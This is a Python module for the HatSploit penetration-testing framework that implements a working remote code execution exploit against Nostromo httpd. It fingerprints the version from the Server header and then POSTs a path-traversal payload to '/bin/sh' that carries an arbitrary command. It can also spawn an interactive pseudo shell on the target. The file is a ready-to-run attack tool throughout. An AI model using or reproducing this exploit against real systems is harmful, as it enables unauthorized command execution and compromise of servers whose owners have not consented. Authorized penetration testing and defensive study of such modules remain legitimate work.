#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from core.lib.module import HatSploitModule

from utils.tcp_tools import tcp_tools
from utils.pseudo_shell import pseudo_shell
from utils.web_tools import web_tools

class HatSploitModule(HatSploitModule):
    tcp_tools = tcp_tools()
    pseudo_shell = pseudo_shell()
    web_tools = web_tools()

    details = {
        'Name': "Nostromo Httpd Remote Code Execution",
        'Module': "exploit/multi/nostromo_httpd/remote_code_execution",
        'Authors': [
            'enty8080'
        ],
        'Description': "Remote Code Execution in Nostromo Httpd.",
        'Dependencies': [
            ''
        ],
        'Comments': [
            ''
        ],
        'Risk': "high"
    }

    options = {
        'RHOST': {
            'Description': "Remote host.",
            'Value': None,
            'Required': True
        },
        'RPORT': {
            'Description': "Remote port.",
            'Value': 80,
            'Required': True
        },
        'COMMAND': {
            'Description': "Command to execute",
            'Value': "whoami",
            'Required': True
        },
        'PSEUDO': {
            'Description': "Spawn Pseudo shell.",
            'Value': "no",
            'Required': False
        }
    }

    def format_response(self, response):
        response = response.split('\r\n\r\n', 1)
        if len(response) == 2:
            return response[1].strip()
        return None

    def execute_command(self, target_url, command):
        self.badges.output_process("Generating payload...")

        path = '/.%0d./.%0d./.%0d./.%0d./bin/sh'
        data = f'echo\necho\n{command} 2>&1'

        self.badges.output_process("Sending payload...")
        response = self.web_tools.http_request("POST", target_url, path, data)

        self.badges.output_process("Attempting to execute command...")
        response = self.format_response(response)

        return (True, response)

    def check_vulnerable(self, target_url):
        if self.web_tools.check_url_access(target_url):
            headers = self.web_tools.http_request("HEAD", target_url, "/").headers
            if 'Server' in headers.keys():
                server = headers['Server']

                if int(server.split('.')[-1]) < 7:
                    return True
        return False

    def run(self):
        remote_host, remote_port, command, pseudo = self.parser.parse_options(self.options)

        target = self.web_tools.format_host_and_port(remote_host, remote_port)
        self.badges.output_process("Exploiting " + target + "...")

        target_url = self.web_tools.craft_url(remote_host, remote_port)
        if not self.check_vulnerable(target_url):
            self.badges.output_error("Exploit failed!")
            return

        arguments = (target_url)
        if pseudo in ['yes', 'y']:
            self.pseudo_shell.spawn_pseudo_shell(self.details['Module'], self.execute_command, arguments)
        else:
            self.pseudo_shell.execute_command(self.execute_command, command, arguments)
